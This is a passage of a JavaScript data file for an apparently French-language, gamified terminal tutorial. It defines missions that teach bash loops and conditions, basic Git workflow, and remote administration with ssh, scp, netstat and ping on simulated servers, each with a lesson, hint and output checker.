            { cmd: 'echo "il y a $n logs"',  comment: "# → il y a 3 logs" },
            { cmd: 'echo "on est le $(date)"', comment: "# injecte la date" },
          ],
          tip: "On lit `$( … )` de l'intérieur vers l'extérieur : d'abord la commande interne, puis le remplacement."
        },
        desc: "Compte les fichiers <strong>.log</strong> et affiche exactement <code>total: N</code> (où N est le nombre), en une seule commande avec <code>$(…)</code>.",
        fs: {
          "app.log":   { type: "file", content: "x" },
          "error.log": { type: "file", content: "y" },
          "debug.log": { type: "file", content: "z" },
          "notes.txt": { type: "file", content: "pas un log" },
        },
        hint: 'echo "total: $(ls *.log | wc -l)"',
        check: (out) => /total:\s*3/.test(out),
        explanation: "Tu as capturé la sortie d'un pipeline (<code>ls | wc -l</code>) directement dans un texte. C'est ce qui permet aux scripts de <em>réagir</em> aux données réelles du système au lieu de valeurs figées."
      },

      {
        id: 39,
        name: "Étape 3 — Une boucle for",
        cmd: "for … done",
        xp: 50,
        lesson: {
          title: "La boucle <code>for</code> — répéter sans se répéter",
          intro: "Faire la même action sur plusieurs éléments ? C'est le boulot de <code>for</code>. Elle parcourt une liste (des mots, des fichiers via <code>*</code>, une séquence…) et exécute le bloc entre <code>do</code> et <code>done</code> pour chacun. La variable de boucle prend chaque valeur tour à tour.",
          syntax: "for VAR in liste; do  commandes  ; done",
          options: [
            { flag: "for f in *.txt", desc: "Boucle sur tous les .txt" },
            { flag: "do … done",      desc: "Le bloc répété (le corps de la boucle)" },
            { flag: "$f",             desc: "L'élément courant, à chaque tour" },
          ],
          examples: [
            { cmd: "for f in *.log; do echo $f; done", comment: "# affiche chaque .log" },
            { cmd: "for i in 1 2 3; do echo n$i; done", comment: "# n1 n2 n3" },
            { cmd: "for f in *.txt; do wc -l $f; done",  comment: "# compte chaque fichier" },
          ],
          tip: "Sur une seule ligne, sépare par des `;` : `for … ; do … ; done`. Sur plusieurs lignes, le prompt devient `>` en attendant `done`."
        },
        desc: "Pour <strong>chaque fichier .txt</strong>, affiche son nom. Utilise une boucle <code>for</code> avec le joker <code>*.txt</code>.",
        fs: {
          "rapport.txt": { type: "file", content: "a" },
          "notes.txt":   { type: "file", content: "b" },
          "todo.txt":    { type: "file", content: "c" },
          "script.log":  { type: "file", content: "d" },
        },
        hint: "for f in *.txt; do echo $f; done",
        check: (out) => /rapport\.txt/.test(out) && /notes\.txt/.test(out) && /todo\.txt/.test(out) && !/\.log/.test(out),
        explanation: "Une boucle, trois fichiers traités automatiquement — et ça marcherait pareil avec 3 000 fichiers. C'est exactement comme ça qu'on renomme en masse, qu'on sauvegarde des dossiers, qu'on traite des logs. Tu ne te répéteras plus jamais."
      },

      {
        id: 40,
        name: "Étape 4 — Boucle + action utile",
        cmd: "for + wc",
        xp: 50,
        lesson: {
          title: "Une boucle qui <em>travaille</em>",
          intro: "Dans le corps d'une boucle, tu peux mettre n'importe quelle commande — pas juste <code>echo</code>. C'est là que l'automatisation devient concrète : compter les lignes de chaque log, chercher un motif dans chaque fichier, sauvegarder chaque dossier…",
          syntax: "for f in *.log; do  wc -l $f  ; done",
          options: [
            { flag: "wc -l $f",        desc: "Compte les lignes du fichier courant" },
            { flag: "grep X $f",       desc: "Cherche X dans chaque fichier" },
            { flag: "cp $f backup/",   desc: "Sauvegarde chaque fichier" },
          ],
          examples: [
            { cmd: "for f in *.log; do wc -l $f; done", comment: "# lignes de chaque log" },
            { cmd: "for f in *.conf; do grep port $f; done", comment: "# le port de chaque conf" },
          ],
          tip: "Le corps peut contenir plusieurs commandes, séparées par des `;`. Chaque tour les exécute toutes."
        },
        desc: "Pour <strong>chaque fichier .log</strong>, affiche son <strong>nombre de lignes</strong> (boucle <code>for</code> + <code>wc -l</code>).",
        fs: {
          "access.log": { type: "file", content: "l1\nl2\nl3" },
          "error.log":  { type: "file", content: "e1\ne2" },
          "debug.log":  { type: "file", content: "d1" },
        },
        hint: "for f in *.log; do wc -l $f; done",
        check: (out) => /access\.log/.test(out) && /error\.log/.test(out) && /\b3\b/.test(out) && /\b2\b/.test(out),
        explanation: "Chaque log compté d'un seul geste. Remplace <code>wc -l</code> par <code>grep ERROR</code> et tu as un mini-outil d'analyse ; par <code>cp … backup/</code> et tu as une sauvegarde automatique. La boucle, c'est le couteau suisse de l'admin."
      },

      {
        id: 41,
        name: "Étape 5 — Une condition",
        cmd: "if [ … ]",
        xp: 55,
        lesson: {
          title: "Les conditions <code>if</code> / <code>test</code>",
          intro: "Un script intelligent prend des décisions. <code>if</code> exécute un bloc <strong>seulement si</strong> une condition est vraie. La condition s'écrit avec <code>test</code> ou sa forme courte <code>[ … ]</code> (attention aux espaces autour des crochets !).",
          syntax: "if [ condition ]; then  …  else  …  ; fi",
          options: [
            { flag: "[ -f fichier ]", desc: "Vrai si le fichier existe" },
            { flag: "[ -d dossier ]", desc: "Vrai si le dossier existe" },
            { flag: "[ $a = $b ]",    desc: "Vrai si égaux (texte)" },
            { flag: "[ $n -gt 3 ]",   desc: "Vrai si n > 3 (-lt -eq -ge…)" },
          ],
          examples: [
            { cmd: "if [ -f config.json ]; then echo ok; fi", comment: "# si le fichier est là" },
            { cmd: "if [ $x -gt 10 ]; then echo grand; else echo petit; fi", comment: "" },
          ],
          tip: "Les espaces sont OBLIGATOIRES : `[ -f x ]` marche, `[-f x]` non. Et ça se ferme par `fi` (if à l'envers)."
        },
        desc: "Vérifie si le fichier <code>config.json</code> existe : <strong>si oui, affiche <code>present</code></strong>. Utilise <code>if</code> avec <code>[ -f … ]</code>.",
        fs: {
          "config.json": { type: "file", content: '{"port":3000}' },
          "readme.txt":  { type: "file", content: "doc" },
        },
        hint: "if [ -f config.json ]; then echo present; fi",
        check: (out) => /present/.test(out),
        explanation: "Ton script sait maintenant <em>réagir</em> : il n'agit que si la condition est remplie. Combine <code>if</code> avec une boucle et tu obtiens des scripts qui vérifient, filtrent et décident — la vraie automatisation, celle qui tourne sans toi à 3h du matin."
      },

      {
        id: 42,
        name: "Étape 6 — Lancer un vrai script",
        cmd: "bash script.sh",
        xp: 70,
        lesson: {
          title: "Exécuter un <code>script</code> complet",
          intro: "Un script, c'est une suite de commandes rangées dans un fichier <code>.sh</code>. On l'exécute avec <code>bash fichier.sh</code> (ou <code>./fichier.sh</code> s'il est exécutable). Toute la puissance — variables, boucles, conditions — réunie dans un seul fichier réutilisable. C'est l'aboutissement du scripting.",
          syntax: "bash script.sh      ou      ./script.sh",
          options: [
            { flag: "bash s.sh",   desc: "Exécute le script avec bash" },
            { flag: "./s.sh",      desc: "L'exécute directement (si chmod +x)" },
            { flag: "cat s.sh",    desc: "Lis-le d'abord pour savoir ce qu'il fait !" },
          ],
          examples: [
            { cmd: "cat deploy.sh",   comment: "# TOUJOURS lire un script avant de le lancer" },
            { cmd: "bash deploy.sh",  comment: "# puis l'exécuter" },
          ],
          tip: "Règle de sécurité : on ne lance JAMAIS un script sans l'avoir lu avant (`cat`). Un script, ça peut tout faire sur ta machine."
        },
        desc: "Le script <code>deploy.sh</code> automatise le déploiement (il contient une boucle). Lis-le si tu veux, puis <strong>exécute-le</strong>.",
        fs: {
          "deploy.sh": { type: "file", perms: "-rwxr-xr-x", content: 'echo "== deploiement =="\nfor s in web db cache; do\n  echo "-> $s deploye"\ndone\necho "== termine =="' },
          "readme.md": { type: "file", content: "Lance deploy.sh pour tout déployer d'un coup." },
        },
        hint: "cat deploy.sh   pour le lire, puis   bash deploy.sh",
        check: (out) => /web/.test(out) && /db/.test(out) && /cache/.test(out) && /termine/.test(out),
        explanation: "Tu viens d'exécuter un vrai script d'automatisation : il a bouclé sur trois services et les a « déployés » tout seul. Variables, boucles, conditions, scripts — tu as maintenant les outils pour transformer n'importe quelle corvée répétitive en une seule commande. Bienvenue chez les vrais admins. 🤖"
      }
    ]
  },

  // ════════════════════════════════════════════════════════════
  {
    id: 8,
    title: "🌱 Scénario 8 — Versionner avec Git",
    scenario: "Le projet grossit, l'équipe s'agrandit. Il est temps d'arrêter d'envoyer des fichiers par email et d'apprendre l'outil que tout développeur utilise au quotidien : Git. Historique, sauvegardes, branches — plus jamais tu ne perdras une ligne de code.",
    missions: [

      {
        id: 43,
        name: "Étape 1 — Initialiser un dépôt",
        cmd: "git init",
        xp: 40,
        lesson: {
          title: "<code>git init</code> — Créer un dépôt Git",
          intro: "Git suit l'historique d'un dossier. Avant de pouvoir enregistrer quoi que ce soit, il faut transformer ce dossier en <strong>dépôt Git</strong> (un « repo »). Ça crée un sous-dossier caché <code>.git/</code> qui contiendra tout l'historique — mais tes fichiers, eux, ne bougent pas.",
          syntax: "git init",
          options: [
            { flag: "git init",  desc: "Initialise un dépôt dans le dossier courant" },
            { flag: ".git/",     desc: "Le dossier caché créé (visible avec ls -a)" },
          ],
          examples: [
            { cmd: "git init",  comment: "# → Dépôt Git vide initialisé dans .../.git/" },
            { cmd: "ls -a",     comment: "# le dossier .git apparaît" },
          ],
          tip: "On ne fait `git init` qu'UNE seule fois par projet, au tout début. Pas besoin de le refaire à chaque commit."
        },
        desc: "Transforme ce dossier en dépôt Git avec <code>git init</code>.",
        fs: {
          "app.py":    { type: "file", content: "print('hello dojo')" },
          "readme.md": { type: "file", content: "# Mon projet" },
        },
        hint: "git init",
        check: (out, s) => !!s.gitInit,
        explanation: "Le dossier est maintenant un dépôt Git : Git peut suivre chaque modification à partir de maintenant. Rien n'est encore enregistré — juste le suivi qui vient de démarrer. Prochaine étape : lui dire QUOI suivre."
      },

      {
        id: 44,
        name: "Étape 2 — Mettre en scène (add)",
        cmd: "git add",
        xp: 40,
        lesson: {
          title: "<code>git add</code> — Ajouter à l'index (staging)",
          intro: "Git ne sauvegarde pas tout automatiquement. Tu choisis explicitement quels fichiers seront inclus dans la prochaine sauvegarde grâce à <code>git add</code> — c'est la « zone de staging ». <code>git status</code> te montre en permanence ce qui est prêt et ce qui ne l'est pas.",
          syntax: "git add fichier      ·      git add .",
          options: [
            { flag: "git add app.py", desc: "Met UN fichier en scène" },
            { flag: "git add .",      desc: "Met TOUS les fichiers du dossier en scène" },
            { flag: "git status",     desc: "Affiche ce qui est en scène / non suivi" },
          ],
          examples: [
            { cmd: "git status",     comment: "# voir l'état avant" },
            { cmd: "git add app.py", comment: "# mettre app.py en scène" },
            { cmd: "git status",     comment: "# app.py apparaît en vert" },
          ],
          tip: "`git add .` est pratique mais dangereux sur un vrai projet : relis toujours `git status` avant, pour ne pas ajouter un fichier secret par erreur."
        },
        desc: "Vérifie l'état du dépôt avec <code>git status</code>, puis mets <strong>tous les fichiers</strong> en scène avec <code>git add .</code>.",
        fs: {
          "app.py":    { type: "file", content: "print('hello dojo')" },
          "readme.md": { type: "file", content: "# Mon projet" },
        },
        hint: "git init && git add .",
        check: (out, s) => Array.isArray(s.gitAdd) && s.gitAdd.length >= 2,
        explanation: "Tes fichiers sont maintenant « en scène » (staged) : prêts à être enregistrés dans l'historique au prochain commit. Rien n'est encore définitif — tu peux encore ajouter ou retirer des fichiers avant de valider."
      },

      {
        id: 45,
        name: "Étape 3 — Valider (commit)",
        cmd: "git commit -m",
        xp: 50,
        lesson: {
          title: "<code>git commit</code> — Enregistrer un instantané",
          intro: "Un <strong>commit</strong>, c'est une photo de ton projet à un instant T, accompagnée d'un message qui explique ce qui a changé. Chaque commit reste pour toujours dans l'historique : tu peux toujours revenir en arrière. Le message (<code>-m</code>) doit être clair — c'est ce que toute l'équipe lira.",
          syntax: 'git commit -m "message clair"',
          options: [
            { flag: "-m \"...\"", desc: "Le message du commit (obligatoire ici)" },
            { flag: "git log",   desc: "Pour revoir l'historique après" },
          ],
          examples: [
            { cmd: 'git commit -m "premiere version"', comment: "# enregistre ce qui est en scène" },
            { cmd: "git log",                            comment: "# vérifier que le commit existe" },
          ],
          tip: "Un bon message de commit décrit le POURQUOI, pas juste le quoi : `\"corrige le bug de connexion\"` vaut mieux que `\"fix\"`."
        },
        desc: "Valide les fichiers mis en scène avec un commit dont le message est exactement <code>initial commit</code>.",
        fs: {
          "app.py":    { type: "file", content: "print('hello dojo')" },
          "readme.md": { type: "file", content: "# Mon projet" },
        },
        hint: 'git init && git add . && git commit -m "initial commit"',
        check: (out, s) => s.gitCommit === "initial commit",
        explanation: "Premier commit posé ! Ce n'est plus une simple copie de fichiers : c'est un point de l'histoire de ton projet, daté, signé, et récupérable pour toujours. C'est la brique de base de tout travail en équipe."
      },

      {
        id: 46,
        name: "Étape 4 — Consulter l'historique",
        cmd: "git log",
        xp: 45,
        lesson: {
          title: "<code>git log</code> — L'historique des commits",
          intro: "Après plusieurs commits, comment savoir ce qui a été fait, quand, et pourquoi ? <code>git log</code> affiche l'historique complet : identifiant unique (hash), auteur, et message de chaque commit, du plus récent au plus ancien.",
          syntax: "git log",
          options: [
            { flag: "commit <hash>", desc: "Identifiant unique de la sauvegarde" },
            { flag: "message",       desc: "Ce que tu as tapé après -m" },
          ],
          examples: [
            { cmd: "git log", comment: "# liste tous les commits, du + récent au + ancien" },
          ],
          tip: "Le hash (ex: `71c89e0`) identifie un commit de façon unique — c'est ce que tu utiliserais pour y revenir plus tard."
        },
        desc: "Fais deux commits successifs (n'importe quels messages), puis consulte l'historique avec <code>git log</code>.",
        fs: {
          "app.py":    { type: "file", content: "print(1)" },
          "readme.md": { type: "file", content: "doc" },
        },
        hint: 'git init && git add app.py && git commit -m "app" && git add readme.md && git commit -m "readme" && git log',
        check: (out, s) => !!s.gitLog && s.gitCommitCount >= 2,
        explanation: "Tu peux maintenant lire l'histoire complète du projet. Sur un vrai dépôt avec des centaines de commits, `git log` (avec ses options comme `--oneline`) est l'outil numéro 1 pour comprendre « qui a fait quoi, et quand »."
      },

      {
        id: 47,
        name: "Étape 5 — Travailler sur une branche",
        cmd: "git checkout -b",
        xp: 55,
        lesson: {
          title: "Les <code>branches</code> — travailler sans casser le principal",
          intro: "Une branche est une ligne de développement parallèle. La branche <code>main</code> reste stable pendant que tu expérimentes ailleurs, sans risque. <code>git checkout -b nom</code> crée une nouvelle branche ET bascule dessus en une seule commande.",
          syntax: "git branch nom          ·          git checkout -b nom",
          options: [
            { flag: "git branch",         desc: "Liste les branches (* = celle active)" },
            { flag: "git branch nom",     desc: "Crée une branche SANS y basculer" },
            { flag: "git checkout nom",   desc: "Bascule sur une branche existante" },
            { flag: "git checkout -b nom", desc: "Crée ET bascule en une seule commande" },
          ],
          examples: [
            { cmd: "git checkout -b feature-login", comment: "# nouvelle branche de travail" },
            { cmd: "git branch",                     comment: "# feature-login est marquée *" },
          ],
          tip: "Convention d'équipe classique : `main` reste toujours stable et déployable ; tout nouveau travail se fait sur une branche dédiée."
        },
        desc: "Crée une nouvelle branche appelée <code>feature-login</code> et bascule dessus directement, en une seule commande.",
        fs: {
          "app.py": { type: "file", content: "print(1)" },
        },
        hint: "git init && git checkout -b feature-login",
        check: (out, s) => s.gitCheckout === "feature-login",
        explanation: "Tu es maintenant sur ta propre branche : tout commit que tu feras ici n'affectera pas <code>main</code> tant que tu ne l'y fusionnes pas. C'est ce qui permet à plusieurs personnes de travailler en parallèle sans se marcher dessus."
      },

      {
        id: 48,
        name: "Étape 6 — Le workflow complet",
        cmd: "init → add → commit → status",
        xp: 70,
        lesson: {
          title: "Le <code>workflow Git</code> de base, de bout en bout",
          intro: "En vrai, tu enchaînes toujours les mêmes étapes : initialiser (une fois), modifier des fichiers, <code>add</code> pour choisir ce qui est prêt, <code>commit</code> pour valider, et <code>status</code> à tout moment pour vérifier où tu en es. C'est ce cycle que tu répéteras des milliers de fois dans ta carrière.",
          syntax: "git init → git add → git commit -m \"...\" → git status",
          options: [
            { flag: "git status", desc: "Ton meilleur ami : à taper à chaque doute" },
          ],
          examples: [
            { cmd: "git init",                    comment: "# une seule fois" },
            { cmd: "git add .",                   comment: "# préparer" },
            { cmd: 'git commit -m "message"',     comment: "# valider" },
            { cmd: "git status",                  comment: "# vérifier que tout est propre" },
          ],
          tip: "Si `git status` dit « rien à valider, la copie de travail est propre », tout ton travail est en sécurité dans l'historique."
        },
        desc: "Initialise le dépôt, ajoute <strong>tous</strong> les fichiers, commit avec le message <code>mission finale</code>, puis termine par un <code>git status</code> qui doit être propre.",
        fs: {
          "app.py":    { type: "file", content: "print(1)" },
          "readme.md": { type: "file", content: "doc" },
          "config.yml":{ type: "file", content: "debug: false" },
        },
        hint: 'git init && git add . && git commit -m "mission finale" && git status',
        check: (out, s) => s.gitCommit === "mission finale" && !!s.gitStatus && /propre/.test(out),
        explanation: "Tu maîtrises maintenant le cycle Git de base — celui que des millions de développeurs utilisent chaque jour, de la plus petite startup aux plus gros projets open source. Prochaine étape naturelle une fois sur le terrain : <code>git push</code> vers un dépôt distant comme GitHub, pour partager ton travail avec une équipe. 🌱"
      }
    ]
  },

  // ════════════════════════════════════════════════════════════
  {
    id: 9,
    title: "🌐 Scénario 9 — Réseau & administration distante",
    scenario: "Le projet tourne maintenant sur de vrais serveurs, pas seulement en local. Il est temps d'apprendre à se connecter à distance, transférer des fichiers en toute sécurité, et diagnostiquer un serveur sans jamais y avoir mis les pieds physiquement.",
    missions: [

      {
        id: 49,
        name: "Étape 1 — Se connecter en SSH",
        cmd: "ssh utilisateur@hôte",
        xp: 40,
        lesson: {
          title: "<code>ssh</code> — Se connecter à une machine distante",
          intro: "SSH (Secure Shell) est LE protocole pour administrer un serveur à distance, de façon chiffrée. Une fois connecté, ton terminal ne contrôle plus ta machine : il contrôle le serveur distant. Le prompt change pour te le rappeler en permanence.",
          syntax: "ssh utilisateur@hôte",
          options: [
            { flag: "ssh admin@serveur", desc: "Se connecte en tant qu'admin sur 'serveur'" },
            { flag: "exit",              desc: "Se déconnecter et revenir en local" },
          ],
          examples: [
            { cmd: "ssh admin@webserver01", comment: "# connexion au serveur web" },
          ],
          tip: "Regarde bien le prompt après connexion : `admin@webserver01` au lieu de `user@dojo` — c'est ton seul indice visuel que tu es maintenant AILLEURS."
        },
        desc: "Connecte-toi en SSH au serveur <code>webserver01</code> avec l'utilisateur <code>admin</code>.",
        fs: {},
        hint: "ssh admin@webserver01",
        check: (out, s) => s.sshHost === "webserver01" && s.sshUser === "admin",
        explanation: "Te voilà connecté à distance. Sur un vrai serveur, absolument tout ce que tu tapes maintenant s'exécute LÀ-BAS, pas sur ta machine — c'est puissant, et ça peut faire mal si on n'y fait pas attention."
      },

      {
        id: 50,
        name: "Étape 2 — Inspecter les services actifs",
        cmd: "netstat",
        xp: 40,
        lesson: {
          title: "<code>netstat</code> — Voir ce qui écoute sur le réseau",
          intro: "Une fois sur un serveur, une des premières questions à se poser : quels services tournent, et sur quels ports ? <code>netstat</code> (ou son équivalent moderne <code>ss</code>) répond à ça — indispensable pour diagnostiquer ou sécuriser une machine.",
          syntax: "netstat",
          options: [
            { flag: "LISTEN", desc: "Le service attend activement des connexions sur ce port" },
            { flag: ":22",    desc: "Port SSH, ouvert pour l'administration distante" },
            { flag: ":80/:443", desc: "Ports web (HTTP / HTTPS)" },
          ],
          examples: [
            { cmd: "ssh admin@webserver01", comment: "# se connecter d'abord" },
            { cmd: "netstat",               comment: "# lister les services en écoute" },
          ],
          tip: "Un service qui écoute sur un port que tu ne reconnais pas est souvent le premier signe d'un serveur compromis. Réflexe à avoir."
        },
        desc: "Connecte-toi à <code>webserver01</code>, puis liste les services en écoute avec <code>netstat</code>.",
        fs: {},
        hint: "ssh admin@webserver01 && netstat",
        check: (out) => /listen/.test(out),
        explanation: "Tu sais maintenant lire l'activité réseau d'un serveur d'un coup d'œil : sshd sur 22, nginx sur 80/443, mysqld sur 3306... chaque ligne te dit quel service tourne et où."
      },

      {
        id: 51,
        name: "Étape 3 — Transférer un fichier (scp)",
        cmd: "scp fichier user@hôte:/chemin",
        xp: 45,
        lesson: {
          title: "<code>scp</code> — Copier un fichier vers un serveur distant",
          intro: "Comment déposer un fichier sur un serveur sans interface graphique ni FTP ? <code>scp</code> (secure copy) copie un fichier via le même chiffrement que SSH, en une seule commande, sans jamais avoir besoin de s'y connecter au préalable.",
          syntax: "scp fichier utilisateur@hôte:/chemin/destination",
          options: [
            { flag: "fichier",        desc: "Le fichier local à envoyer" },
            { flag: "user@hôte:/chemin", desc: "Où l'envoyer sur la machine distante" },
          ],
          examples: [
            { cmd: "scp deploy.sh admin@webserver01:/var/www", comment: "# envoyer un script sur le serveur" },
          ],
          tip: "`scp` se tape depuis TA machine, avant de te connecter — pas besoin d'ouvrir une session SSH pour transférer un fichier."
        },
        desc: "Envoie le fichier <code>deploy.sh</code> vers <code>/var/www</code> sur le serveur <code>webserver01</code>, utilisateur <code>admin</code>.",
        fs: {
          "deploy.sh": { type: "file", content: "echo déploiement en cours..." },
        },
        hint: "scp deploy.sh admin@webserver01:/var/www",
        check: (out, s) => !!s.scp && s.scp.file === "deploy.sh" && s.scp.host === "webserver01",
        explanation: "Fichier envoyé, chiffré de bout en bout. Ce réflexe (envoyer d'abord, se connecter ensuite pour vérifier) est exactement le workflow qu'utilisent les admins système au quotidien pour déployer sans interface graphique."
      },

      {
        id: 52,
        name: "Étape 4 — Se déconnecter proprement",
        cmd: "exit",
        xp: 35,
        lesson: {
          title: "<code>exit</code> en SSH — Revenir sur sa machine",
          intro: "Rester connecté à un serveur qu'on n'utilise plus est une mauvaise pratique (risque de sécurité, session oubliée ouverte). <code>exit</code> ferme la connexion SSH et te ramène sur ta machine locale — le prompt redevient celui du dojo.",
          syntax: "exit",
          options: [],
          examples: [
            { cmd: "ssh admin@webserver01", comment: "# connexion" },
            { cmd: "exit",                   comment: "# déconnexion propre" },
          ],
          tip: "Vérifie toujours ton prompt avant de taper une commande destructrice : si tu es encore connecté à un serveur, ce n'est PAS ta machine que tu vas modifier."
        },
        desc: "Connecte-toi à <code>webserver01</code> en tant qu'<code>admin</code>, puis déconnecte-toi proprement.",
        fs: {},
        hint: "ssh admin@webserver01 && exit",
        check: (out, s) => s.sshExit === "webserver01",
        explanation: "Retour à la maison, propre et net. Ce réflexe simple évite bien des sessions fantômes oubliées ouvertes sur des serveurs de production — un vrai risque de sécurité si quelqu'un d'autre s'assoit devant ton clavier."
      },

      {
        id: 53,
        name: "Étape 5 — Vérifier avant de se connecter",
        cmd: "ping puis ssh",
        xp: 40,
        lesson: {
          title: "Diagnostiquer avant d'agir : <code>ping</code> + <code>ssh</code>",
          intro: "Avant de perdre du temps à essayer de se connecter à un serveur, un bon réflexe d'admin : vérifier qu'il répond sur le réseau. <code>ping</code> confirme que la machine est joignable avant même de tenter une connexion SSH.",
          syntax: "ping hôte   puis   ssh utilisateur@hôte",
          options: [
            { flag: "ping hôte", desc: "Vérifie que la machine répond sur le réseau" },
            { flag: "0% perte de paquets", desc: "Bon signe : la machine est bien joignable" },
          ],
          examples: [
            { cmd: "ping webserver01",       comment: "# vérifier d'abord" },
            { cmd: "ssh admin@webserver01",  comment: "# se connecter ensuite" },
          ],
          tip: "Sur un vrai réseau d'entreprise, un ping qui ne répond pas peut vouloir dire : machine éteinte, pare-feu qui bloque, ou mauvaise adresse — ça évite de chercher un bug ailleurs pour rien."
        },
        desc: "Vérifie que <code>dbserver02</code> répond avec <code>ping</code>, puis connecte-toi dessus en tant qu'utilisateur <code>root</code>.",
        fs: {},
        hint: "ping dbserver02 && ssh root@dbserver02",
        check: (out, s) => s.sshHost === "dbserver02" && s.sshUser === "root",
        explanation: "Diagnostiquer avant d'agir : ce réflexe simple (vérifier qu'un serveur est joignable avant de s'acharner dessus) fait gagner un temps fou en situation réelle d'incident, où chaque minute compte."
      },

      {
        id: 54,
        name: "Étape 6 — Le workflow complet d'un déploiement",
        cmd: "scp → ssh → netstat → exit",
        xp: 75,
        lesson: {
          title: "Le <code>workflow réseau</code> complet, de bout en bout",
          intro: "En situation réelle, tu enchaînes : envoyer le fichier nécessaire (<code>scp</code>), se connecter pour vérifier que tout est en ordre (<code>ssh</code> puis <code>netstat</code>), puis repartir proprement (<code>exit</code>). C'est exactement le cycle qu'utilise un admin système pour un déploiement manuel.",
          syntax: "scp → ssh → netstat → exit",
          options: [],
          examples: [
            { cmd: "scp backup.sql root@dbserver02:/backups", comment: "# 1. envoyer le fichier" },
            { cmd: "ssh root@dbserver02",                       comment: "# 2. se connecter pour vérifier" },
            { cmd: "netstat",                                    comment: "# 3. vérifier les services actifs" },
            { cmd: "exit",                                       comment: "# 4. repartir proprement" },
          ],
          tip: "Ce cycle scp → ssh → vérification → exit est LE workflow de base de l'administration système distante. Tu viens de le faire de bout en bout."
        },
        desc: "Envoie <code>backup.sql</code> vers <code>/backups</code> sur <code>dbserver02</code> (utilisateur <code>root</code>), connecte-toi pour vérifier les services actifs, puis déconnecte-toi.",
        fs: {
          "backup.sql": { type: "file", content: "-- dump SQL de sauvegarde" },
        },
        hint: "scp backup.sql root@dbserver02:/backups && ssh root@dbserver02 && netstat && exit",
        check: (out, s) => !!s.scp && s.scp.file === "backup.sql" && s.scp.host === "dbserver02" && s.sshExit === "dbserver02",
        explanation: "Tu viens de dérouler un vrai cycle d'administration distante, du transfert de fichier jusqu'à la déconnexion propre. Ajoute la maîtrise de Git du scénario précédent, et tu as les bases exactes du quotidien d'un admin système ou d'un développeur backend. 🌐"
      }
    ]
  }
];

const ALL_MISSIONS = CHAPTERS.flatMap(c => c.missions.map(m => ({ ...m, chapterId: c.id, chapterTitle: c.title })));
